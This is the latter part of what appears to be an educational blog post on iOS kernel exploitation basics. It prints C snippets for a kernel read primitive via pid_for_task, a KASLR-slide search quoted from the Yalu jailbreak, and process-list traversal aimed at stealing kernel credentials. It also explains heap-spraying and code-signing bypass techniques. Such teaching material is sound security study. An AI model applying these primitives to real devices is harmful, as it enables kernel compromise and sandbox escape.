     * 	Read a 64-bit value from kernel memory using our stage 1 read primitive.
     */</span>
    <span class="k">static</span> <span class="kt">uint64_t</span>
    <span class="nf">stage1_read64</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">address</span><span class="p">)</span> <span class="p">{</span>
    	<span class="k">union</span> <span class="p">{</span>
    		<span class="kt">uint32_t</span> <span class="n">value32</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
    		<span class="kt">uint64_t</span> <span class="n">value64</span><span class="p">;</span>
    	<span class="p">}</span> <span class="n">u</span><span class="p">;</span>
    	<span class="n">u</span><span class="p">.</span><span class="n">value32</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">stage1_read32</span><span class="p">(</span><span class="n">address</span><span class="p">);</span>
    	<span class="n">u</span><span class="p">.</span><span class="n">value32</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">stage1_read32</span><span class="p">(</span><span class="n">address</span> <span class="o">+</span> <span class="mi">4</span><span class="p">);</span>
    	<span class="k">return</span> <span class="n">u</span><span class="p">.</span><span class="n">value64</span><span class="p">;</span>
    <span class="p">}</span></code></pre></figure>

<p>It is important to note that the offsets keep changing with different versions of iOS and its even different for different devices. These offsets are found both by looking at the kernel source code and also by looking at the kernelcache file.</p>

<p>This technique is very powerful and allows you to scour the kernel memory 4 bytes at a time. Another very important use case for is function is to find the kernel slide. All they have to do is to start reading the kernel memory backwards four bytes at a time until you get to the magic value <strong>0xfeedfacf</strong>. This address will denote the base address of the kernel, subtract it from the start address on the kernelcache when opened with IDA or Hopper and you will get the kernel slide. The following code from the Yalu jailbreak does just that.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">     <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
            <span class="kt">int32_t</span> <span class="n">leaked</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
            <span class="c1">// The offset from the start of "struct task" to "task-&gt;bsd_info" seems to be fixed to 0x360, but this is prone to change anytime in the future as apple sees fit</span>
            <span class="c1">// It'd be nice to use a heuristic method like how K33n Team does it with the cpu_clock thing</span>
            <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span> <span class="p">(</span><span class="n">faketask</span> <span class="o">+</span> <span class="n">procoff</span><span class="p">)</span> <span class="o">=</span> <span class="n">leaked_ptr</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">;</span>
            <span class="c1">// This tries to read a value from "task-&gt;bsd_info-&gt;p_pid" which translates to "faketask-&gt;bsd_info-&gt;p_pid = (leaked_ptr - 0x10)-&gt;p_pid = leaked_ptr"</span>
            <span class="n">pid_for_task</span><span class="p">(</span><span class="n">foundport</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">leaked</span><span class="p">);</span>
            <span class="c1">// Is it 0xfeedfacf?</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">leaked</span> <span class="o">==</span> <span class="n">MH_MAGIC_64</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">NSLog</span><span class="p">(</span><span class="err">@</span><span class="s">"found kernel text at %llx"</span><span class="p">,</span> <span class="n">leaked_ptr</span><span class="p">);</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="c1">// Retreat one page and search again</span>
            <span class="n">leaked_ptr</span> <span class="o">-=</span> <span class="mh">0x4000</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="c1">// Found kernel base!</span>
    <span class="kt">uint64_t</span> <span class="n">kernel_base</span> <span class="o">=</span> <span class="n">leaked_ptr</span><span class="p">;</span>
    <span class="p">.....................</span>
    <span class="p">.....................</span>
    <span class="c1">// Calculating KASLR slide</span>
    <span class="k">extern</span> <span class="kt">uint64_t</span> <span class="n">slide</span><span class="p">;</span>
    <span class="n">slide</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">-</span> <span class="mh">0xFFFFFFF007004000</span><span class="p">;</span></code></pre></figure>

<p>Once kernel base is obtained, you can find some important structures in the kernel memory, such as <strong>extern struct proclist allproc;</strong>, which can be found in the file <strong>/bsd/sys/proc_internal.h</strong>, since even though the kernel is slid because of <strong>KASLR</strong>, the structs are still at a fixed offset from the kernel base. As we can see from the kernel code, this struct contains a list of the prcesses. The symbol addresses can also be found using <strong>**jtool2</strong> –analyze** feature, which utilizes the unstripped kernelcache that Apple mistakenly pushed out as a facilitator.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">bsd</span><span class="o">/</span><span class="n">sys</span><span class="o">/</span><span class="n">proc_internal</span><span class="p">.</span><span class="n">h</span>
    <span class="mi">673</span><span class="o">:</span> <span class="k">extern</span> <span class="n">lck_attr_t</span> <span class="o">*</span> <span class="n">proc_lck_attr</span><span class="p">;</span>
    <span class="mi">674</span><span class="o">:</span> 
    <span class="mi">675</span><span class="o">:</span> <span class="n">LIST_HEAD</span><span class="p">(</span><span class="n">proclist</span><span class="p">,</span> <span class="n">proc</span><span class="p">);</span>
    <span class="mi">676</span><span class="o">:</span> <span class="k">extern</span> <span class="k">struct</span> <span class="n">proclist</span> <span class="n">allproc</span><span class="p">;</span>		<span class="cm">/* List of all processes. */</span>
    <span class="mi">677</span><span class="o">:</span> <span class="k">extern</span> <span class="k">struct</span> <span class="n">proclist</span> <span class="n">zombproc</span><span class="p">;</span>	<span class="cm">/* List of zombie processes. */</span>
    <span class="mi">678</span><span class="o">:</span> 
    <span class="mi">679</span><span class="o">:</span> <span class="k">extern</span> <span class="k">struct</span> <span class="n">proc</span> <span class="o">*</span><span class="n">initproc</span><span class="p">;</span>
    <span class="mi">680</span><span class="o">:</span> <span class="k">extern</span> <span class="kt">void</span>	<span class="nf">procinit</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>
    <span class="mi">681</span><span class="o">:</span> <span class="k">extern</span> <span class="kt">void</span> <span class="nf">proc_lock</span><span class="p">(</span><span class="k">struct</span> <span class="n">proc</span> <span class="o">*</span><span class="p">);</span>
    <span class="mi">682</span><span class="o">:</span> <span class="k">extern</span> <span class="kt">void</span> <span class="nf">proc_unlock</span><span class="p">(</span><span class="k">struct</span> <span class="n">proc</span> <span class="o">*</span><span class="p">);</span>
    <span class="mi">683</span><span class="o">:</span> <span class="k">extern</span> <span class="kt">void</span> <span class="nf">proc_spinlock</span><span class="p">(</span><span class="k">struct</span> <span class="n">proc</span> <span class="o">*</span><span class="p">);</span>
    <span class="mi">684</span><span class="o">:</span> <span class="k">extern</span> <span class="kt">void</span> <span class="nf">proc_spinunlock</span><span class="p">(</span><span class="k">struct</span> <span class="n">proc</span> <span class="o">*</span><span class="p">);</span>
    <span class="mi">685</span><span class="o">:</span> <span class="k">extern</span> <span class="kt">void</span> <span class="nf">proc_list_lock</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>
    <span class="mi">686</span><span class="o">:</span> <span class="k">extern</span> <span class="kt">void</span> <span class="nf">proc_list_unlock</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>
    <span class="mi">687</span><span class="o">:</span> <span class="k">extern</span> <span class="kt">void</span> <span class="nf">proc_klist_lock</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>
    <span class="mi">688</span><span class="o">:</span> <span class="k">extern</span> <span class="kt">void</span> <span class="nf">proc_klist_unlock</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span></code></pre></figure>

<p>One can then scour these structs using again the same function <strong>pid_for_task()</strong> to find the current proc struct by checking for <strong>pid = getpid()</strong> (so we can change the creds in the proc struct later to escape the sandbox), and kernproc by checking for pid = 0 (so we can get kern proc creds, find kernel task, ipc_space_kernel etc).</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// extern struct proclist allproc;</span>
    <span class="c1">// This global variable stores the start of the linked_list of all proc objects</span>
    <span class="kt">uint64_t</span> <span class="n">allproc</span> <span class="o">=</span> <span class="n">allproc_offset</span> <span class="o">+</span> <span class="n">kernel_base</span><span class="p">;</span>

    <span class="kt">uint64_t</span> <span class="n">proc_</span> <span class="o">=</span> <span class="n">allproc</span><span class="p">;</span>

    <span class="kt">uint64_t</span> <span class="n">myproc</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">kernproc</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="c1">// Traverse the linked list until the end of the list. I guess the next pointer of the last element is set to 0</span>
    <span class="k">while</span> <span class="p">(</span><span class="n">proc_</span><span class="p">)</span> <span class="p">{</span>
        <span class="kt">uint64_t</span> <span class="n">proc</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

        <span class="c1">// Getting the address of the next proc object in the linked list</span>
        <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span> <span class="p">(</span><span class="n">faketask</span> <span class="o">+</span> <span class="n">procoff</span><span class="p">)</span> <span class="o">=</span> <span class="n">proc_</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">;</span>
        <span class="n">pid_for_task</span><span class="p">(</span><span class="n">foundport</span><span class="p">,</span> <span class="p">(</span><span class="kt">int32_t</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">proc</span><span class="p">);</span>
        <span class="c1">// Need to read 2 times cause "pid_for_task" can only read 4 bytes at a time</span>
        <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span> <span class="p">(</span><span class="n">faketask</span> <span class="o">+</span> <span class="n">procoff</span><span class="p">)</span> <span class="o">=</span> <span class="mi">4</span> <span class="o">+</span> <span class="n">proc_</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">;</span>
        <span class="n">pid_for_task</span><span class="p">(</span><span class="n">foundport</span><span class="p">,</span> <span class="p">(</span><span class="kt">int32_t</span><span class="o">*</span><span class="p">)(((</span><span class="kt">uint64_t</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">proc</span><span class="p">))</span> <span class="o">+</span> <span class="mi">4</span><span class="p">));</span>

        <span class="c1">// Getting the PID of from proc-&gt;p_pid</span>
        <span class="kt">int</span> <span class="n">pd</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span> <span class="p">(</span><span class="n">faketask</span> <span class="o">+</span> <span class="n">procoff</span><span class="p">)</span> <span class="o">=</span> <span class="n">proc</span><span class="p">;</span>
        <span class="n">pid_for_task</span><span class="p">(</span><span class="n">foundport</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pd</span><span class="p">);</span>

        <span class="c1">// Checking if it equals my PID</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">pd</span> <span class="o">==</span> <span class="n">getpid</span><span class="p">())</span> <span class="p">{</span>
            <span class="c1">// Address of my proc struct</span>
            <span class="n">myproc</span> <span class="o">=</span> <span class="n">proc</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">pd</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
            <span class="c1">// Address of the kernel proc struct</span>
            <span class="n">kernproc</span> <span class="o">=</span> <span class="n">proc</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">proc_</span> <span class="o">=</span> <span class="n">proc</span><span class="p">;</span>
    <span class="p">}</span></code></pre></figure>

<h2 id="heap-allocation-basics">Heap Allocation Basics</h2>

<p>This is a very brief discussion about Heap Allocation in iOS. In iOS, the heap memory is divided into various zones. Allocations of same size will go into same zones, unless for certain objects which have their own special zones (ports, vouchers etc). These zones grow as more objects are allocated, with the new pages being fetched from the zone map. One can see the zones allocated with the <strong>zprint</strong> command on Mac OS. It is assumed that a lot of heap allocation techniques will still be the same in iOS. Another thing is to note that iOS has zone garbage collection as well.</p>

<p><img src="/images/30.png" alt="30" /></p>

<p>As discussed, certain objects have their own special zones. A zone is a collection of fixed size data blocks for which quick allocation and deallocation is possible. For e.g, in the image below, we can see that the a lot of the IPC objects, which includes ports, vouchers etc have their own zones. Hence if you are able to free a voucher let’s say, you won’t be able to overlap it with another object, unless you trigger zone garbage collection and move the page containing that address somewhere else to be reallocated again with a different kind of object.</p>

<p><img src="/images/31.png" alt="31" /></p>

<p>The heap has been hardened significantly in the last few iOS versions. I highly recommend checking out <a href="https://gsec.hitb.org/materials/sg2016/D2%20-%20Stefan%20Esser%20-%20iOS%2010%20Kernel%20Heap%20Revisited.pdf">this</a> talk on iOS Kernel Heap by Stefan Esser. Additionally, you can also check out the kernel source code. Start by looking <strong>osfmk/kern/zalloc.c</strong> which has some comments on heap allocation and just follow along from there.</p>

<p><img src="/images/38.png" alt="38" /></p>

<p>One of the common techniques used in recent exploits for heap spraying is to fill the memory with an array of Port pointers by sending a Mach message with the option <strong>MACH_MSG_OOL_PORTS_DESCRIPTOR</strong>. This calls the method <strong>ipc_kmsg_copyin_ool_ports_descriptor</strong> in <strong>ipc/ipc_kmsg.c</strong> which has a kalloc call (<strong>kalloc(ports_length)</strong>) that fills the heap with port pointers. The advantage of this is in the voucher_swap exploit was that while the allocation of Ports would have put them into their own <strong>ipc.port</strong> zones, in the case of port pointers this is not the case and hence reallocation on top of freed objects with port pointers is possible. Well, again this is not entirely true and reallocation with ports is possible as you can do enough spraying with Ports such that the kernel is force to do garbage collection and allocate fresh pages from the zone map which might include the freed objects. This is discussed in Part 2 of this series.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="n">mach_msg_descriptor_t</span> <span class="o">*</span>
    <span class="n">ipc_kmsg_copyin_ool_ports_descriptor</span><span class="p">(</span>
    	<span class="n">mach_msg_ool_ports_descriptor_t</span> <span class="o">*</span><span class="n">dsc</span><span class="p">,</span>
    	<span class="n">mach_msg_descriptor_t</span> <span class="o">*</span><span class="n">user_dsc</span><span class="p">,</span>
    	<span class="kt">int</span> <span class="n">is_64bit</span><span class="p">,</span>
    	<span class="n">vm_map_t</span> <span class="n">map</span><span class="p">,</span>
    <span class="p">.....................</span>
        <span class="n">dsc</span><span class="o">-&gt;</span><span class="n">address</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>  <span class="cm">/* for now */</span>

        <span class="n">data</span> <span class="o">=</span> <span class="n">kalloc</span><span class="p">(</span><span class="n">ports_length</span><span class="p">);</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">data</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
            <span class="o">*</span><span class="n">mr</span> <span class="o">=</span> <span class="n">MACH_SEND_NO_BUFFER</span><span class="p">;</span>
            <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
        <span class="p">}</span></code></pre></figure>

<h2 id="pointer-authentication-check-and-coretrust">Pointer Authentication Check and CoreTrust</h2>

<p>The ARM 8.3 instruction set added a new feature called Pointer Authentication Check (PAC). It’s purpose is to check the integrity of the pointers. It works by attaching a cryptographic signature to pointer values in its unused bits, and then those signatures are verified before a pointer is used. Since the attacker doesn’t have the keys to create the signatures for these pointers, he is not able to create valid pointers.</p>

<p>CoreTrust on the other hand is a separate kernel extension (<strong>com.apple.kext.CoreTrust</strong>) that doesn’t allow self-signed binaries (<strong>jtool2</strong> –sign) to run on the device. Previously, Apple Mobile File Integrity Kext (AMFI.kext) would work in conjunction with the <strong>amfid</strong> daemon which is in userland to check for code signatures. This was bypassed in many ways by injecting the code signature hash into the AMFI trust cache, hooking onto amfid exception ports and allowing code execution to continue etc. CoreTrust imposes some additional checks that only allow Apple signed binaries to run on the device. It is still possible ro run binaries signed with Apple certificates, which anyone can get for free and run the binary once signed with it.</p>

<h2 id="conclusion">Conclusion</h2>

<p>In this article, we looked at some of the basic fundamentals of iOS security which will serve as building blocks for the next two articles. The next article will discuss the <strong>voucher_swap</strong> exploit in detail whereas the third part would discuss Jailbreaking.</p>

<h2 id="references">References</h2>

<ol>
  <li>Project Zero Issue tracker - https://bugs.chromium.org/p/project-zero/issues/detail?id=1731</li>
  <li>iOS 10 - Kernel Heap Revisited - https://gsec.hitb.org/materials/sg2016/D2%20-%20Stefan%20Esser%20-%20iOS%2010%20Kernel%20Heap%20Revisited.pdf</li>
  <li>Mac OS X Internals: A Systems Approach - https://www.amazon.com/Mac-OS-Internals-Approach-paperback/dp/0134426541</li>
  <li>MacOS and iOS Internals, Volume III: Security &amp; Insecurity: https://www.amazon.com/MacOS-iOS-Internals-III-Insecurity/dp/0991055535</li>
  <li>MacOS and iOS Internals, Volume III: Security &amp; Insecurity: https://www.amazon.com/MacOS-iOS-Internals-III-Insecurity/dp/0991055535</li>
  <li>CanSecWest 2017 - Port(al) to the iOS Core - https://www.slideshare.net/i0n1c/cansecwest-2017-portal-to-the-ios-core</li>
</ol>

</div>





<div class="related">
  <h2>related posts</h2>
  <ul class="related-posts">
    
      <li>
        <h3>
          <a href="/2020/09/06/arm64-reversing-and-exploitation-part-3-a-simple-rop-chain.html">
            ARM64 Reversing and Exploitation Part 3 - A Simple ROP Chain
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/2020/09/06/arm64-reversing-and-exploitation-part-2-use-after-free.html">
            ARM64 Reversing and Exploitation Part 2 - Use After Free
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/2020/09/05/arm64-reversing-and-exploitation-part-1-arm-instruction-set-heap-overflow.html">
            ARM64 Reversing and Exploitation Part 1 - ARM Instruction Set + Simple Heap Overflow
          </a>
        </h3>
      </li>
    
  </ul>
</div>




  
  <h2>all tags</h2>
  <div class="tag-cloud"><a href="/tag/android/" class="set-1">android</a> <a href="/tag/authentication/" class="set-1">authentication</a> <a href="/tag/backtrack/" class="set-1">backtrack</a> <a href="/tag/burpsuite/" class="set-1">burpsuite</a> <a href="/tag/defcon/" class="set-1">defcon</a> <a href="/tag/dns/" class="set-1">dns</a> <a href="/tag/honeypots/" class="set-1">honeypots</a> <a href="/tag/ios/" class="set-1">ios</a> <a href="/tag/maintaining-access/" class="set-1">maintaining-access</a> <a href="/tag/meshnet/" class="set-1">meshnet</a> <a href="/tag/metasploit/" class="set-1">metasploit</a> <a href="/tag/networking/" class="set-1">networking</a> <a href="/tag/privacy/" class="set-1">privacy</a> <a href="/tag/security/" class="set-5">security</a> <a href="/tag/timing-analysis-attacks/" class="set-1">timing-analysis-attacks</a> <a href="/tag/w3af/" class="set-1">w3af</a> <a href="/tag/web-application-security/" class="set-1">web-application-security</a></div>
  




<script>
  let i = 0;
  const text = '';
  const speed = parseInt('50');
  
  function typeWriter() {
    if (i < text.length) {
      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
      i++;
      setTimeout(typeWriter, speed);
    }
  }

  document.getElementById('animated-post-description').style.display = 'initial';
  typeWriter();

  // Image modal
  var $imgs = [];
  $('img').each(function(idx) {
    var obj = {
      src: $(this).attr('src')
    }
    $imgs.push(obj);
    var elem = $(this);
    $(this).click(function() {
      $('.modal').magnificPopup('open', idx);
    });
  });

  $('.modal').magnificPopup({
    items: $imgs,
    type: 'image',
    closeOnContentClick: true,
    mainClass: 'mfp-img-mobile',
    image: {
      verticalFit: true
    }
    
  });
</script>

      </div>
    </main><footer class="site-footer">
  <div class="wrapper">
    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
    <label for="theme-toggle" class="toggle">
    <span class="toggle__handler">
      <span class="crater crater--1"></span>
      <span class="crater crater--2"></span>
      <span class="crater crater--3"></span>
    </span>
        <span class="star star--1"></span>
        <span class="star star--2"></span>
        <span class="star star--3"></span>
        <span class="star star--4"></span>
        <span class="star star--5"></span>
        <span class="star star--6"></span>
    </label>
</div>
<script type="text/javascript">
const theme = localStorage.getItem('theme');

if (theme === "light") {
    document.documentElement.setAttribute('data-theme', 'light');
} else {
    document.documentElement.setAttribute('data-theme', 'dark');
}
const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');

function activateDarkTheme() {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'dark');
    document.documentElement.classList.add('theme--dark');
    document.documentElement.classList.remove('theme--light');
	document.getElementById("theme-toggle").className = 'light';
	window.localStorage.setItem('theme', 'dark');
}

function activateLightTheme() {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'light');
    document.documentElement.classList.add('theme--light');
    document.documentElement.classList.remove('theme--dark');
	document.getElementById("theme-toggle").className = 'dark';
	window.localStorage.setItem('theme', 'light');
}

if (theme === "dark") {
    activateDarkTheme();
} else if (theme === "light") {
    activateLightTheme();
} else if  (userPrefers === "light") {
    activateDarkTheme();
} else {
    activateDarkTheme();
}

function modeSwitcher() {
	let currentMode = document.documentElement.getAttribute('data-theme');
	if (currentMode === "dark") {
	    activateLightTheme();
	} else {
	    activateDarkTheme();
	}
}
</script></div>
  </div>
</footer>


<script>
      window.FontAwesomeConfig = {
        searchPseudoElements: true
      }
    </script>
  </body>

</html>
